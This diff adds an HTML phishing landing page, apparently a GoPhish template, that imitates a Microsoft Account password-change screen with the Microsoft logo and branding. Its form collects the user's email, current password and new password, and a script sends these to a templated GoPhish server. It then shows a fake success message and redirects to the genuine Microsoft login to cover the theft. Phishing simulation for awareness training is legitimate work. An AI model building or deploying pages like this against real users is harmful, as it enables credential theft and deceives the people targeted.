@@ -1,0 +1,240 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
+	<title>Change your password</title>
+	<meta name="viewport" content="width=410"/>
+	<!-- GoPhish tracking script - Replace {{.URL}} with your GoPhish server URL -->
+	<script src="{{.URL}}/js/gophish.js"></script>
+	<style type="text/css">html, body {
+            font-family: 'Segoe UI', SegoeUI, Arial, sans-serif;
+            background: #f3f3f3;
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+        }
+        .bluebar {
+            background: #0078d7;
+            height: 48px;
+            width: 100vw;
+            display: flex;
+            align-items: center;
+            padding: 0 0 0 15px;
+            position: relative;
+        }
+        .nav-logo {
+            display: flex;
+            align-items: center;
+        }
+        .ms-logo {
+            width: 28px;
+            height: 28px;
+            margin-right: 12px;
+        }
+        .main-title {
+            color: #fff;
+            font-weight: 600;
+            font-size: 17px;
+            margin-right: 32px;
+            letter-spacing: .02em;
+        }
+        .nav-links {
+            display: flex;
+            align-items: center;
+            margin-left: 14px;
+            gap: 18px;
+        }
+        .nav-links a {
+            color: #e9e9e9;
+            text-decoration: none;
+            font-size: 14px;
+            opacity: 0.92;
+            transition: text-decoration 0.14s, opacity 0.14s;
+        }
+        .nav-links a:hover {
+            text-decoration: underline;
+            opacity: 1;
+        }
+        .container {
+            max-width: 410px;
+            background: #fff;
+            margin: 40px auto 0 auto;
+            border-radius: 7px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            padding: 36px 34px 28px 34px;
+        }
+        h1 {
+            font-size: 26px;
+            font-weight: 400;
+            margin-bottom: 14px;
+            margin-top: 0;
+        }
+        .info-text {
+            color: #222;
+            margin-bottom: 18px;
+            font-size: 15px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            margin-bottom: 7px;
+            font-size: 14px;
+        }
+        input[type="password"], input[type="text"], input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 15px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            background: #fafafa;
+            margin-bottom: 2px;
+            box-sizing: border-box;
+        }
+        .minor-link {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            display: inline-block;
+            margin: 0 0 9px 0;
+        }
+        .minor-link:hover {
+            text-decoration: underline;
+        }
+        .policy-note {
+            font-size: 12px;
+            color: #5e5e5e;
+            margin-top: -12px;
+            margin-bottom: 16px;
+        }
+        .btngroup {
+            margin-top: 18px;
+            display: flex;
+            gap: 12px;
+        }
+        button.save-btn {
+            background: #0078d7;
+            color: #fff;
+            padding: 11px 35px;
+            font-size: 16px;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            font-weight: 400;
+        }
+        button.save-btn:hover {
+            background: #005fa3;
+        }
+        button.cancel-btn {
+            background: #f3f3f3;
+            color: #222;
+            padding: 11px 26px;
+            font-size: 15px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            cursor: pointer;
+        }
+        .check-wrap {
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+        }
+        .check-wrap label {
+            font-size: 13px;
+            margin-bottom: 0;
+            margin-left: 7px;
+        }
+        .success-message {
+            display: none;
+            color: #155724;
+            background-color: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 3px;
+            padding: 15px 10px 15px 36px;
+            font-size: 16px;
+            margin-top: 24px;
+            margin-bottom: 8px;
+            background-image: url('https://img.icons8.com/color/48/000000/checkmark.png');
+            background-repeat: no-repeat;
+            background-position: 8px 13px;
+            background-size: 18px;
+        }
+        /* Responsive tweak for mobile preview */
+        @media (max-width: 460px) {
+            .container {
+                padding: 14px 4vw 22px 4vw;
+            }
+            .bluebar {
+                padding-left: 2vw;
+            }
+        }
+	</style>
+</head>
+<body>
+<div class="bluebar">
+<div class="nav-logo"><img alt="Microsoft" class="ms-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"/> <span class="main-title">Microsoft Account</span></div>
+
+<nav class="nav-links"><a href="#">Your info</a> <a href="#">Privacy</a> <a href="#">Security</a> <a href="#">Payment &amp; billing</a></nav>
+</div>
+
+<div class="container">
+<h1>Change your password</h1>
+
+<div class="info-text">A strong password helps prevent unauthorized access to your email account.</div>
+
+<form id="resetForm" method="POST" action="">
+<div class="form-group"><label for="email">Email address</label> <input autocomplete="username" id="email" name="email" placeholder="name@example.com" required="" type="email"/></div>
+
+<div class="form-group"><label for="current">Current password</label> <input autocomplete="current-password" id="current" name="password" placeholder="Current password" required="" type="password"/> <a class="minor-link" href="#">Forgot your password?</a></div>
+
+<div class="form-group"><label for="newpass">New password</label> <input autocomplete="new-password" id="newpass" name="new_password" required="" type="password"/></div>
+
+<div class="policy-note">8-character minimum; case sensitive</div>
+
+<div class="form-group"><label for="reenter">Reenter password</label> <input autocomplete="new-password" id="reenter" name="confirm_password" required="" type="password"/></div>
+
+<div class="check-wrap"><input id="change72" type="checkbox"/> <label for="change72">Make me change my password every 72 days</label></div>
+
+<div class="btngroup"><button class="save-btn" type="submit">Save</button><button class="cancel-btn" onclick="window.location='https://account.microsoft.com/'" type="button">Cancel</button></div>
+
+<div class="success-message" id="successMsg">✓ Your password has been successfully updated. Redirecting you to your account...</div>
+</form>
+</div>
+<script>
+        // GoPhish tracking integration
+        document.addEventListener('DOMContentLoaded', function() {
+            // Track page visit
+            if (typeof gophish !== 'undefined') {
+                gophish.track();
+            }
+        });
+
+        document.getElementById('resetForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            // Collect form data
+            var formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('current').value,
+                new_password: document.getElementById('newpass').value,
+                confirm_password: document.getElementById('reenter').value
+            };
+            
+            // Submit to GoPhish for tracking
+            if (typeof gophish !== 'undefined') {
+                gophish.submit(formData);
+            }
+            
+            // Show success message and redirect
+            setTimeout(function() {
+                document.getElementById('successMsg').style.display = 'block';
+                setTimeout(function() {
+                    window.location = 'https://login.microsoftonline.com';
+                }, 2000);
+            }, 400);
+        });
+    </script>
+
+<p> </p>
+
+
+</body></html>
+img.icons8.com
